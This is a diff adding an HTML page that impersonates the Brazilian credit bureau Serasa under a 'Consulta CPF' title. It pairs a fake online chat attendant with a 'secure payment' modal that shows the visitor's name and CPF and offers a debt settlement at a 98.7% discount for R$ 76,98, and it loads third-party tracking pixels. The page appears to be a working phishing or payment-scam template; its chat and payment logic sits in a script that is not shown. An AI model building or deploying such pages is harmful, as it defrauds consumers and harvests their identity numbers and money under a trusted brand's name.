@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+
+    <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<script>
+  window.pixelId = "68917b90ddb4765a12824441";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Serasa - Consulta CPF</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+
+    <div class="agent-banner" role="status" aria-live="polite">
+        <img style="width: 30px; object-fit: cover; border-radius: 50%;" src="./img/hostAvatar.png" alt="">
+  <span class="dot" aria-hidden="true"></span>
+  <span class="agent-name">Renata Silva</span>
+  <span>· atendente ·</span>
+  <span class="status">online</span>
+</div>
+
+
+
+    <div class="chat-container">
+        <!-- Removed WhatsApp header, keeping only simple chat header -->
+
+
+        <!-- Área de mensagens -->
+        <div class="chat-messages" id="chat-messages">
+            
+        <div class="typing-indicator" id="typing-indicator" style="display: none;">
+            <div class="typing-dots">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            
+        </div>
+
+        </div>
+
+        <!-- Área de input -->
+        <div class="chat-input-area" id="chat-input-area" style="display: none;">
+            <div class="input-container">
+                <input type="text" id="message-input" placeholder="Digite uma mensagem">
+                <button id="send-button">➤</button>
+            </div>
+        </div>
+
+        <!-- Loading indicator -->
+
+    </div>
+
+    <!-- Modal para pagamento -->
+    <div class="payment-modal" id="payment-modal" style="display: none;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Área de Pagamento Seguro 🔐</h3>
+                <button class="close-modal" id="close-modal">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="payment-info">
+                    <h4>Acordo N2L618E83N362</h4>
+                    <p><strong>Nome:</strong> <span id="payment-name"></span></p>
+                    <p><strong>CPF:</strong> <span id="payment-cpf"></span></p>
+                    <p><strong>Valor:</strong> R$ 76,98</p>
+                    <p><strong>Desconto:</strong> 98,7% (R$ 7.489,02)</p>
+                </div>
+                <button class="payment-button">PAGAR AGORA</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
